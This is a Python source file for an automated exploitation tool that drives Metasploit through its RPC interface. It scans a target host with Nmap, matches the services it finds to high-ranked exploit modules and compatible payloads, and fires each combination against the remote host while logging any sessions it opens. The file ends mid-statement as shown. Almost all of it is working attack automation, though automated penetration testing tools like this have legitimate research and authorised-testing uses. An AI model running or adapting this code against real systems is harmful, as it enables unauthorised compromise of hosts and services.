#!/bin/env python
# -*- coding: utf-8 -*-
import sys
import os
import time
import re
import copy
import json
import csv
import codecs
import random
import ipaddress
import configparser
import msgpack
import http.client
import threading
import numpy as np
import pandas as pd
from bs4 import BeautifulSoup
from docopt import docopt
from util import Utilty

# Index of target host's state (s).
ST_OS_TYPE = 0    # OS types (unix, linux, windows, osx..).
ST_SERV_NAME = 1  # Product name on Port.
ST_SERV_VER = 2   # Product version.
ST_MODULE = 3     # Exploit module types.
ST_TARGET = 4     # target types (0, 1, 2..).
# ST_STAGE = 5      # exploit's stage (normal, exploitation, post-exploitation).
NUM_STATES = 5    # Size of state.
NONE_STATE = None
NUM_ACTIONS = 0

# Label type of printing.
OK = 'ok'         # [*]
NOTE = 'note'     # [+]
FAIL = 'fail'     # [-]
WARNING = 'warn'  # [!]
NONE = 'none'     # No label.

# Metasploit interface.
class Msgrpc:
    def __init__(self, option=[]):
        self.host = option.get('host') or "127.0.0.1"
        self.port = option.get('port') or 55552
        self.uri = option.get('uri') or "/api/"
        self.ssl = option.get('ssl') or False
        self.authenticated = False
        self.token = False
        self.headers = {"Content-type": "binary/message-pack"}
        if self.ssl:
            self.client = http.client.HTTPSConnection(self.host, self.port)
        else:
            self.client = http.client.HTTPConnection(self.host, self.port)

        self.util = Utilty()

        # Read config.ini.
        full_path = os.path.dirname(os.path.abspath(__file__))
        config = configparser.ConfigParser()
        try:
            config.read(os.path.join(full_path, 'config.ini'))
        except FileExistsError as err:
            self.util.print_message(FAIL, 'File exists error: {}'.format(err))
            sys.exit(1)
        # Common setting value.
        self.msgrpc_user = config['Common']['msgrpc_user']
        self.msgrpc_pass = config['Common']['msgrpc_pass']
        self.timeout = int(config['Common']['timeout'])
        self.con_retry = int(config['Common']['con_retry'])
        self.retry_count = 0
        self.console_id = 0

    # Call RPC API.
    def call(self, meth, option=[]):
        # Set API option.
        option = self.set_api_option(meth, option)

        # Send request.
        resp = self.send_request(meth, option)
        return msgpack.unpackb(resp.read())

    def set_api_option(self, meth, option):
        if meth == 'console.create' or meth == 'job.list' or meth == 'session.list':
            option = []
        if meth != 'auth.login':
            if not self.authenticated:
                self.util.print_message(FAIL, 'MsfRPC: Not Authenticated.')
                exit(1)
        if meth != 'auth.login':
            option.insert(0, self.token)
        option.insert(0, meth)
        return option

    # Send HTTP request.
    def send_request(self, meth, option):
        params = msgpack.packb(option)
        resp = ''
        try:
            self.client.request("POST", self.uri, params, self.headers)
            resp = self.client.getresponse()
            self.retry_count = 0
        except Exception as err:
            while True:
                # Retry.
                self.util.print_message(WARNING, 'Retry "{}" call. reason: {}'.format(option[0], err))
                resp = self.send_request(meth, option) 
                break
        return resp

    # Log in to RPC Server.
    def login(self, user, password):
        ret = self.call('auth.login', [user, password])
        try:
            if ret.get(b'result') == b'success':
                self.authenticated = True
                self.token = ret[b'token']
                return True
            else:
                self.util.print_message(FAIL, 'MsfRPC: Authentication failed.')
                exit(1)
        except Exception as e:
            self.util.print_exception(e, 'Failed: auth.login')
            exit(1)

    #Create MSFconsole.  
    def get_console(self):
        try:
            # Create a console.
            ret = self.call('console.create')
            self.console_id = ret.get(b'id')
        except Exception as err:
            self.util.print_exception(err, 'get_console Failed: console.create')
            exit(1)
        return self.console_id

    # Get all modules.
    def get_module_list(self, module_type):
        ret = {}
        if module_type == 'exploit':
            ret = self.call('module.exploits', [])
        elif module_type == 'auxiliary':
            ret = self.call('module.auxiliary', [])
        elif module_type == 'post':
            ret = self.call('module.post', [])
        elif module_type == 'payload':
            ret = self.call('module.payloads', [])
        elif module_type == 'encoder':
            ret = self.call('module.encoders', [])
        elif module_type == 'nop':
            ret = self.call('module.nops', [])

        try:
            byte_list = ret[b'modules']
            string_list = []
            for module in byte_list:
                string_list.append(module.decode('utf-8'))
            return string_list
        except Exception as e:
            self.util.print_exception(e, 'Failed: Getting {} module list.'.format(module_type))
            exit(1)

    # Get module detail information.
    def get_module_info(self, module_type, module_name):
        return self.call('module.info', [module_type, module_name])

    # Get payload that compatible module.
    def get_compatible_payload_list(self, module_name):
        ret = self.call('module.compatible_payloads', [module_name])
        try:
            byte_list = ret[b'payloads']
            string_list = []
            for module in byte_list:
                string_list.append(module.decode('utf-8'))
            return string_list
        except Exception as e:
            self.util.print_exception(e, 'Failed: module.compatible_payloads.')
            return []

    # Get payload that compatible target.
    def get_target_compatible_payload_list(self, module_name, target_num):
        ret = self.call('module.target_compatible_payloads', [module_name, target_num])
        try:
            byte_list = ret[b'payloads']
            string_list = []
            for module in byte_list:
                string_list.append(module.decode('utf-8'))
            return string_list
        except Exception as e:
            self.util.print_exception(e, 'Failed: module.target_compatible_payloads.')
            return []

    # Get module options.
    def get_module_options(self, module_type, module_name):
        return self.call('module.options', [module_type, module_name])

    # Execute module.
    def execute_module(self, module_type, module_name, target, selected_payload, rhost, port_num):

        options = {}
        options.update({'RHOST' : rhost})
        options.update({'RPORT' : port_num})
        options.update({'TARGET' : int(target)})
        if selected_payload != '':
            options.update({'PAYLOAD' : selected_payload})
        ret = self.call('module.execute', [module_type, module_name, options])
        
        try:
            job_id = ret[b'job_id']
            uuid = ret[b'uuid'].decode('utf-8')
            return job_id, uuid

        except Exception as e:
            if ret[b'error_code'] == 401:
                self.login(self.msgrpc_user, self.msgrpc_pass)
            else:
                self.util.print_exception(e, 'Failed: module.execute.')
                exit(1)

    # Get job list.
    def get_job_list(self):
        jobs = self.call('job.list')
        try:
            byte_list = jobs.keys()
            job_list = []
            for job_id in byte_list:
                job_list.append(int(job_id.decode('utf-8')))
            return job_list
        except Exception as e:
            self.util.print_exception(e, 'get_job_list Failed: job.list.')
            return []

    # Get job detail information.
    def get_job_info(self, job_id):
        return self.call('job.info', [job_id])

    # Stop job.
    def stop_job(self, job_id):
        return self.call('job.stop', [job_id])

    # Get session list.
    def get_session_list(self):
        return self.call('session.list')

    # Stop session.
    def stop_session(self, session_id):
        msfcmd = self.call('session.stop', [str(session_id)])

    # Log out from RPC Server.
    def logout(self):
        ret = self.call('auth.logout', [self.token])
        try:
            if ret.get(b'result') == b'success':
                self.authenticated = False
                self.token = ''
                return True
            else:
                self.util.print_message(FAIL, 'MsfRPC: Authentication failed.')
                exit(1)
        except Exception as e:
            self.util.print_exception(e, 'Failed: auth.logout')
            exit(1)

    # Disconnection.
    def termination(self, console_id):
        # Kill a console and Log out.
        msfcmd = self.call('console.session_kill', [console_id])
        msfcmd = self.logout()

# Metasploit's environment.
class Metasploit:
    def __init__(self, target_ip='127.0.0.1'):
        self.util = Utilty()
        self.rhost = target_ip
        # Read config.ini.
        full_path = os.path.dirname(os.path.abspath(__file__))
        config = configparser.ConfigParser()
        try:
            config.read(os.path.join(full_path, 'config.ini'))
        except FileExistsError as err:
            self.util.print_message(FAIL, 'File exists error: {}'.format(err))
            sys.exit(1)
        # Common setting value.
        server_host = config['Common']['server_host']
        server_port = int(config['Common']['server_port'])
        self.msgrpc_user = config['Common']['msgrpc_user']
        self.msgrpc_pass = config['Common']['msgrpc_pass']
        self.timeout = int(config['Common']['timeout'])
        self.max_attempt = int(config['Common']['max_attempt'])
        self.save_path = os.path.join(full_path, config['Common']['save_path'])
        self.save_file = os.path.join(self.save_path, config['Common']['save_file'])
        self.data_path = os.path.join(full_path, config['Common']['data_path'])
        if os.path.exists(self.data_path) is False:
            os.mkdir(self.data_path)
        self.plot_file = os.path.join(self.data_path, config['Common']['plot_file'])
        self.port_div_symbol = config['Common']['port_div']

        # Metasploit options setting value.
        self.lhost = server_host
        self.lport = int(config['Metasploit']['lport'])
        self.proxy_host = config['Metasploit']['proxy_host']
        self.proxy_port = int(config['Metasploit']['proxy_port'])
        self.prohibited_list = str(config['Metasploit']['prohibited_list']).split('@')
        self.path_collection = str(config['Metasploit']['path_collection']).split('@')

        # Nmap options setting value.
        self.nmap_command = config['Nmap']['command']
        self.nmap_timeout = config['Nmap']['timeout']
        self.nmap_2nd_command = config['Nmap']['second_command']
        self.nmap_2nd_timeout = config['Nmap']['second_timeout']

        # Report setting value.
        self.report_test_path = os.path.join(full_path, config['Report']['report_test'])
        self.report_train_path = os.path.join(self.report_test_path, config['Report']['report_train'])
        if os.path.exists(self.report_train_path) is False:
            os.mkdir(self.report_train_path)
        self.scan_start_time = self.util.get_current_date()
        self.source_host= server_host

        self.client = Msgrpc({'host': server_host, 'port': server_port})  # Create Msgrpc instance.
        self.client.login(self.msgrpc_user, self.msgrpc_pass)  # Log in to RPC Server.
        self.buffer_seq = 0
        self.isPostExploit = False                             # Executing Post-Exploiting True/False.

    # Create exploit tree.
    def get_exploit_tree(self):
        self.util.print_message(NOTE, 'Get exploit tree.')
        exploit_tree = {}
        if os.path.exists(os.path.join(self.data_path, 'exploit_tree.json')) is False:
            for idx, exploit in enumerate(com_exploit_list):
                console_id = self.client.get_console()
                temp_target_tree = {'targets': []}
                temp_tree = {} 
                # Set exploit module.
                use_cmd = 'use exploit/' + exploit + '\n'
                self.client.call('console.write', [console_id, use_cmd])

                # Get target.
                show_cmd = 'show targets\n'
                target_info = ''
                time_count = 0
                while True:
                    showcmd = self.client.call('console.write', [console_id,show_cmd])
                    ret = self.client.call('console.read', [console_id])
                    # target_info = ''
                    if ret.get(b'data') is None:
                        target_info = bytes(b'no data').decode('utf-8')
                    else:
                        target_info = ret.get(b'data').decode('utf-8')
                    if 'Exploit targets' in target_info:
                        break
                
                    if time_count == 5:
                        self.util.print_message(OK, 'Timeout: {0}'.format(show_cmd))
                        self.util.print_message(OK, 'No exist Targets.')
                        break
                    time.sleep(1.0)
                    time_count += 1
                target_list = self.cutting_strings(r'\s*([0-9]{1,3}) .*[a-z|A-Z|0-9].*[\r\n]', target_info)
                target_list = list(set(target_list))
                target_list.sort()
                for target in target_list:
                    # Get payload list.
                    payload_list = self.client.get_target_compatible_payload_list(exploit, int(target))
                    temp_tree[target] = payload_list
                # Get options.
                options = self.client.get_module_options('exploit', exploit)
                key_list = options.keys()
                option = {}
                for key in key_list:
                    sub_option = {}
                    sub_key_list = options[key].keys()
                    for sub_key in sub_key_list:
                        if isinstance(options[key][sub_key], list):
                            end_option = []
                            for end_key in options[key][sub_key]:
                                end_option.append(end_key.decode('utf-8'))
                            sub_option[sub_key.decode('utf-8')] = end_option
                        else:
                            end_option = {}
                            if isinstance(options[key][sub_key], bytes):
                                sub_option[sub_key.decode('utf-8')] = options[key][sub_key].decode('utf-8')
                            else:
                                sub_option[sub_key.decode('utf-8')] = options[key][sub_key]

                    # User specify.
                    sub_option['user_specify'] = ""
                    option[key.decode('utf-8')] = sub_option

                # Add payloads and targets to exploit tree.
                temp_target_tree['target_list'] = target_list
                temp_target_tree['targets'] = temp_tree
                temp_target_tree['options'] = option
                exploit_tree[exploit] = temp_target_tree
                # Output processing status to console.

                self.util.print_message(OK, '{}/{} exploit:{}, targets:{}'.format(str(idx + 1),
                                                                                  len(com_exploit_list),
                                                                                  exploit,
                                                                                  len(target_list)))
                #add by oliver for exploit tree
                self.client.call('console.destroy', [console_id])

            # Save exploit tree to local file.
            fout = codecs.open(os.path.join(self.data_path, 'exploit_tree.json'), 'w', 'utf-8')
            json.dump(exploit_tree, fout, indent=4)
            fout.close()
            self.util.print_message(OK, 'Saved exploit tree.')
        else:
            # Get exploit tree from local file.
            local_file = os.path.join(self.data_path, 'exploit_tree.json')
            fin = codecs.open(local_file, 'r', 'utf-8')
            exploit_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()
            self.util.print_message(OK, 'Loaded exploit tree from : {}'.format(local_file))
        return exploit_tree

    # Get target host information.
    def get_target_info(self, rhost, proto_list, port_info):
        self.util.print_message(NOTE, 'Get target info.')
        target_tree = {}
        exploit_count = 0
        service_list = []
        
        if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
            # Create target info.
            target_tree = {
                            'rhost': rhost,
                            'os_type': ostype,
                            'opened_port': len(com_port_list),
                            'opened_port_list': com_port_list,
                            'opened_service': len(port_info),
                            'service_list': service_list,
                            'total_exploit':exploit_count
                          }
            for port_idx, port_num in enumerate(com_port_list):
                console_id = self.client.get_console()
                temp_tree = {'prod_name':'', 'version': '0.0', 'protocol': '', 'exploit': []}

                # Get product name.
                service_name = 'unknown'
                service_name = port_info[port_idx]['prod_name'].lower()
                temp_tree['prod_name'] = service_name
                if service_name == 'unknown':
                    break

                temp_tree['version'] = port_info[port_idx]['version']

                # Get protocol type.
                temp_tree['protocol'] = proto_list[port_idx]

                # Get exploit module.
                module_list = []
                raw_module_info = ''
                idx = 0
                search_cmd = 'search name: ' + service_name + ' type:exploit app:server\n' 
                self.client.call('console.write', [console_id, search_cmd])
                time.sleep(3)
                ret = self.client.call('console.read', [console_id])
                if ret.get(b'data') is None:
                    raw_module_info = bytes(b'no data').decode('utf-8')
                else:
                    raw_module_info = ret.get(b'data').decode('utf-8')
                module_list = self.extract_osmatch_module(self.cutting_strings(r'(exploit/.*\s+\w+)', raw_module_info))
                if service_name != 'unknown' and len(module_list) == 0:
                    self.util.print_message(WARNING, 'Can\'t load exploit module: {}'.format(service_name))

                for module in module_list:
                    if module[1] in {'excellent', 'great'}:
                        temp_tree['exploit'].append(module[0])

                if service_name != 'unknown':
                    target_tree[service_name] = temp_tree
                    service_list.append(service_name)

                # Output processing status to console.
                self.util.print_message(OK, 'Analyzing port {}/{}, {}/{}, '
                                            'Available exploit modules:{}'.format(port_num,
                                                                                  temp_tree['protocol'],
                                                                                  service_name,
                                                                                  port_info[port_idx]['version'],
                                                                                  len(temp_tree['exploit'])))
                exploit_count += len(temp_tree['exploit'])
                self.client.call('console.destroy', [console_id])
            
            target_tree['total_exploit'] = exploit_count
            # Save target host information to local file.
            fout = codecs.open(os.path.join(self.data_path, 'target_info_' + rhost + '.json'), 'w', 'utf-8')
            json.dump(target_tree, fout, indent=4)
            fout.close()
            self.util.print_message(OK, 'Saved target tree.')
        else:
            # Get target host information from local file.
            saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
            fin = codecs.open(saved_file, 'r', 'utf-8')
            target_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()
            self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))

        return target_tree
        
    # Get target OS name.
    def extract_osmatch_module(self, module_list):
        osmatch_module_list = []
        for module in module_list:
            raw_exploit_info = module.split(' ')
            exploit_info = list(filter(lambda s: s != '', raw_exploit_info))
            os_type = exploit_info[0].split('/')[1]
            if ostype == 'windows' and os_type in ['windows', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'unix' and os_type in ['unix', 'freebsd', 'bsdi', 'linux', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'solaris' and os_type in ['solaris', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'osx' and os_type in ['osx', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'netware' and os_type in ['netware', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'linux' and (os_type in ['linux', 'unix', 'multi']):
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'irix' and os_type in ['irix', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'hpux' and os_type in ['hpux', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'freebsd' and os_type in ['freebsd', 'unix', 'bsdi', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'firefox' and os_type in ['firefox', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'dialup' and os_type in ['dialup', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'bsdi' and os_type in ['bsdi', 'unix', 'freebsd', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'apple_ios' and os_type in ['apple_ios', 'unix', 'osx', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'android' and os_type in ['android', 'linux', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif ostype == 'aix' and os_type in ['aix', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            # else:
            #     osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        return osmatch_module_list

    # Parse.
    def cutting_strings(self, pattern, target):
        return re.findall(pattern, target)

    # Get port list from Nmap.
    def get_port_list(self, rhost, command, timeout, nmap_result_file):
        self.client.get_console()
        self.util.print_message(NOTE, 'Execute Nmap against {}'.format(rhost))
        global com_port_list
        global ostype
        port_list = []
        proto_list = []
        info_list = []
        if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
            
            # Execute Nmap.
            self.util.print_message(OK, 'Start time: {}'.format(self.util.get_current_date()))
            msfcmd = self.client.call('console.write', [self.client.console_id, command])

            time_count = 0
            while True:
                # Judgement of Nmap finishing.
                ret = self.client.call('console.read', [self.client.console_id])
                try:
                    if (time_count % 5) == 0:
                        self.util.print_message(OK, 'Port scanning: {} [Elapsed time: {} s]'.format(rhost, time_count))
                  
                    if timeout == time_count:
                        self.client.termination(self.client.console_id)
                        self.util.print_message(OK, 'Timeout   : {}'.format(command))
                        self.util.print_message(OK, 'End time  : {}'.format(self.util.get_current_date()))
                        break

                    status = ret.get(b'busy')
                    if status is False:
                        self.util.print_message(OK, 'End time  : {}'.format(self.util.get_current_date()))
               
                        break
                except Exception as e:
                    self.util.print_exception(e, 'Failed: {}'.format(command))
                time.sleep(1.0)
                time_count += 1

            nmap_result = ''
            cat_cmd = 'cat ' + nmap_result_file + '\n'
            msfcmd = self.client.call('console.write', [self.client.console_id, cat_cmd])
            time.sleep(3.0)

            port_list = []
            proto_list = []
            info_list = []

            nmap_result = open(nmap_result_file, 'rb').read()
            bs = BeautifulSoup(nmap_result, 'lxml')
            ports = bs.find_all('port')
            for idx, port in enumerate(ports):
                port_list.append(str(port.attrs['portid']))
                proto_list.append(port.attrs['protocol'])

                for obj_child in port.contents:
                    service = {}
                    if obj_child.name == 'service':
                        if 'product' in obj_child.attrs:
                            if 'telnet' in obj_child.attrs['product']:
                                service.update({'prod_name': 'telnet'})
                            elif 'Apache' in obj_child.attrs['product']:
                                service.update({'prod_name': 'apache'})
                            elif 'Samba' in obj_child.attrs['product']:
                                service.update({'prod_name': 'samba'})
                            elif 'PostgreSQL' in obj_child.attrs['product']:
                                service.update({'prod_name': 'postgresql'})
                            else:
                                service.update({'prod_name': obj_child.attrs['product']})
                        else:
                            service.update({'prod_name': 'unknown'})
                        if 'version' in obj_child.attrs:
                            service.update({'version': obj_child.attrs['version']})
                        else:
                            service.update({'version': 'unknown'})
                        if 'extrainfo' in obj_child.attrs:
                            service.update({'extrainfo': obj_child.attrs['extrainfo']})
                        else:
                            service.update({'extrainfo': 'unknown'})
                        info_list.append(service)

                # Display getting port information.
                self.util.print_message(OK, 'Getting {}/{} info: {}'.format(str(port.attrs['portid']),
                                                                            port.attrs['protocol'],
                                                                            info_list[idx]['prod_name']))
                                    
                
            some_os = bs.find('osmatch')
            os_name = 'unknown'
            for obj_child in some_os.contents:
                if obj_child.name == 'osclass' and 'osfamily' in obj_child.attrs:
                    os_name = (obj_child.attrs['osfamily']).lower()
                    break
            ostype = os_name

            if len(port_list) == 0:
                self.util.print_message(WARNING, 'No open port.')
                self.util.print_message(WARNING, 'Shutdown Exploit Expert...')
                self.client.termination(self.client.console_id)
                exit(1)
                
            # Update com_port_list.
            only_num = []
            for port in port_list:
                if port.isnumeric():
                    only_num.append(port)
            com_port_list = only_num

        else:
            # Get target host information from local file.
            saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
            fin = codecs.open(saved_file, 'r', 'utf-8')
            target_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()
            self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))
            key_list = list(target_tree.keys())
            for key in key_list[2:]:
                port_list.append(str(key))

            # Update com_port_list.
            only_num = []
            for port in port_list:
                if port.isnumeric():
                    only_num.append(port)
            com_port_list = only_num

        self.client.call('console.destroy', [self.client.console_id])
        return port_list, proto_list, info_list

    # Get Exploit module list.
    def get_exploit_list(self):
        self.util.print_message(NOTE, 'Get exploit list.')
        all_exploit_list = []
        if os.path.exists(os.path.join(self.data_path, 'exploit_list.csv')) is False:
            self.util.print_message(OK, 'Loading exploit list from Metasploit.')

            # Get Exploit module list.
            all_exploit_list = []
            exploit_candidate_list = self.client.get_module_list('exploit')
            for idx, exploit in enumerate(exploit_candidate_list):
                module_info = self.client.get_module_info('exploit', exploit)
                time.sleep(0.1)
                try:
                    rank = module_info[b'rank'].decode('utf-8')
                    if rank in {'excellent', 'great', 'good'}:
                        all_exploit_list.append(exploit)
                        self.util.print_message(OK, '{}/{} Loaded exploit: {}'.format(str(idx + 1),
                                                                                      len(exploit_candidate_list),
                                                                                      exploit))
                    else:
                        self.util.print_message(WARNING, '{}/{} {} module is danger (rank: {}). Can\'t load.'
                                                .format(str(idx + 1), len(exploit_candidate_list), exploit, rank))
                except Exception as e:
                    self.util.print_exception(e, 'Failed: module.info')
                    exit(1)

            # Save Exploit module list to local file.
            self.util.print_message(OK, 'Total loaded exploit module: {}'.format(str(len(all_exploit_list))))
            fout = codecs.open(os.path.join(self.data_path, 'exploit_list.csv'), 'w', 'utf-8')
            for item in all_exploit_list:
                fout.write(item + '\n')
            fout.close()
            self.util.print_message(OK, 'Saved exploit list.')
        else:
            # Get exploit module list from local file.
            local_file = os.path.join(self.data_path, 'exploit_list.csv')
            fin = codecs.open(local_file, 'r', 'utf-8')
            for item in fin:
                all_exploit_list.append(item.rstrip('\n'))
            fin.close()
            self.util.print_message(OK, 'Loaded exploit list from : {}'.format(local_file))
        return all_exploit_list

    # Get payload list.
    def get_payload_list(self, module_name='', target_num=''):
        self.util.print_message(NOTE, 'Get payload list.')
        all_payload_list = []
        if os.path.exists(os.path.join(self.data_path, 'payload_list.csv')) is False or module_name != '':
            self.util.print_message(OK, 'Loading payload list from Metasploit.')

            # Get payload list.
            payload_list = []
            if module_name == '':
                # Get all Payloads.
                payload_list = self.client.get_module_list('payload')

                # Save payload list to local file.
                fout = codecs.open(os.path.join(self.data_path, 'payload_list.csv'), 'w', 'utf-8')
                for idx, item in enumerate(payload_list):
                    time.sleep(0.1)
                    self.util.print_message(OK, '{}/{} Loaded payload: {}'.format(str(idx + 1),
                                                                                  len(payload_list),
                                                                                  item))
                    fout.write(item + '\n')
                fout.close()
                self.util.print_message(OK, 'Saved payload list.')
            elif target_num == '':
                # Get payload that compatible exploit module.
                payload_list = self.client.get_compatible_payload_list(module_name)
            else:
                # Get payload that compatible target.
                payload_list = self.client.get_target_compatible_payload_list(module_name, target_num)
        else:
            # Get payload list from local file.
            local_file = os.path.join(self.data_path, 'payload_list.csv')
            payload_list = []
            fin = codecs.open(local_file, 'r', 'utf-8')
            for item in fin:
                payload_list.append(item.rstrip('\n'))
            fin.close()
            self.util.print_message(OK, 'Loaded payload list from : {}'.format(local_file))
        return payload_list

    # Get available payload list (convert from string to number).
    def get_available_actions(self, payload_list, ostype):
        payload_num_list = []
        for self_payload in payload_list:
            for (idx, payload) in enumerate(com_payload_list):
                if payload == self_payload:
                    if ostype == 'windows':
                        tylist = ['windows', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'unix':
                        tylist = ['unix', 'freebsd', 'bsdi', 'linux', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'solaris':
                        tylist = ['solaris', 'unix', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'osx':
                        tylist = ['osx', 'unix', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'netware':
                        tylist = ['netware', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'linux':
                        tylist = ['linux', 'unix', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'irix':
                        tylist = ['irix', 'unix', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'hpux':
                        tylist = ['hpux', 'unix', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'freebsd':
                        tylist = ['freebsd', 'unix', 'bsdi', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'firefox':
                        tylist = ['firefox', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'dialup':
                        tylist = ['dialup', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'bsdi':
                        tylist = ['bsdi', 'unix', 'freebsd', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'apple_ios':
                        tylist = ['apple_ios', 'unix', 'osx', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'android':
                        tylist = ['android', 'linux', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    elif ostype == 'aix':
                        tylist = ['aix', 'unix', 'multi']
                        for ty in tylist:
                            if ty in self_payload:
                                payload_num_list.append(idx)
                    break
        return payload_num_list

    # Execute exploit.
    def execute_exploit(self, action, target, target_info, idx, exploit_tree, port_num, frame=0):
        # Set payload.
        selected_payload = ''
        if action != 'no payload':
            selected_payload = com_payload_list[action]
        else:
            # No payload
            selected_payload = ''
        
        # Execute exploit.
        message = ''
        session_list = []
        done = False
        job_id, uuid = self.client.execute_module('exploit', target_info['exploit'], target, selected_payload, self.rhost, port_num)
        if uuid is not None:
            msfcmd = self.check_running_module(job_id, uuid)
            sessions = self.client.get_session_list()
            key_list = sessions.keys()
            keyvalue = list(key_list)
            if len(key_list) != 0:
                # Probably successfully of exploitation (but unsettled).
                for key in key_list:
                    # Successfully of exploitation.
                    session_id = int(key)
                    session_type = sessions[key][b'type'].decode('utf-8')
                    session_port = str(sessions[key][b'session_port'])
                    session_service = target_info['prod_name']
                    session_exploit = sessions[key][b'via_exploit'].decode('utf-8')
                    session_payload = sessions[key][b'via_payload'].decode('utf-8')
                    module_info = self.client.get_module_info('exploit', session_exploit)
                    status = True
                    if status:
                        # Successful of post-exploitation.
                        done = True
                        message = 'bingo!! '
                    else:
                        # Failure of post-exploitation.
                        message = 'misfire '

                    # session_list['type'] = session_type
                    # session_list['port'] = session_port
                    # session_list['prod_name'] = session_service
                    # session_list['exploit'] = session_exploit
                    # session_list['target'] = target
                    # session_list['payload'] = session_payload
                    session_list.append({'type':session_type})
                    session_list.append({'port':session_port})
                    session_list.append({'prod_name':session_service})
                    session_list.append({'exploit':session_exploit})
                    session_list.append({'target':target})
                    session_list.append({'payload':session_payload})

                    self.client.stop_session(session_id)
                    break
            else:
                # Failure exploitation.
                message = 'failure '
        else:
            # Time out or internal error of Metasploit.
            done = True
            message = 'time out'

        # Output result to console. 
        self.util.print_message(OK, '{0} {1} ({2}/{3}) '
                                    '{4} | {5} | {6} '.format(message,
                                                                self.rhost,
                                                                target_info['protocol'],
                                                                port_num,
                                                                target_info['prod_name'],
                                                                target_info['exploit'],
                                                                selected_payload))

        if len(keyvalue) != 0:
            self.client.stop_session(keyvalue[0])

        return done, session_list

    # Check status of running module.
    def check_running_module(self, job_id, uuid):
        # Waiting job to finish.
        time_count = 0
        while True:
            job_id_list = self.client.get_job_list()
            if job_id in job_id_list:
                time.sleep(1)
            else:
                return True
            if self.timeout == time_count:
                self.client.stop_job(str(job_id))
                self.util.print_message(WARNING, 'Timeout: job_id={}, uuid={}'.format(job_id, uuid))
                return False
            time_count += 1

# Environment.
class Environment:
    count_trial_each_thread = 0

    def __init__(self, rhost):
        self.env = Metasploit(rhost)
        self.util = Utilty()

    def run(self, exploit_tree, target_tree, service, port_num):
        global frames              # Total number of trial in total session.
        global isFinish            # Finishing of learning/testing flag.
        global exploit_count       # Number of successful exploitation.
        global post_exploit_count  # Number of successful post-exploitation.
        global plot_count          # Exploitation count list for plot.
        global plot_pcount         # Post-exploit count list for plot.
        global sess_info
        global session_list
        global done

        # Execute exploitation.
        self.util.print_message(NOTE, 'Execute exploitation service: {}.'.format(service))
        session_list = []
        execute_list = []
        target_info = {}
        sess_info = {}
        done = False
    
        ostype = target_tree['os_type']
        module_list = target_tree[service]['exploit']
        for exploit in module_list:
            target_list = exploit_tree[exploit[8:]]['target_list']
            service_name = service
            for target in target_list:
                payload_list = exploit_tree[exploit[8:]]['targets'][target]
                if service_name != 'unknown':
                    available_actions = self.env.get_available_actions(payload_list, ostype)
                target_info = {'protocol': target_tree[service]['protocol'],
                                'prod_name': service_name,'version': target_tree[service]['version'],
                                'exploit': exploit[8:], 'target': target}
                for idx, action in enumerate(available_actions):
                    # Execute exploit.
                    done, sess_info = self.env.execute_exploit(action,
                                                               target,
                                                               target_info,
                                                               idx,
                                                               exploit_tree,
                                                               port_num)

            # Store session information.
            if len(sess_info) != 0:
                session_list.append(sess_info)
            # Change port number for next exploitation.
            if done is True:
                break

        # Execute post exploitation.
        print(session_list)
        for session in session_list:
            self.util.print_message(NOTE, 'Execute post exploitation.')
            self.util.print_message(OK, 'Target session info.\n'
                                        '    session id   : {0}\n'
                                        '    session type : {1}\n'
                                        '    target port  : {2}\n'
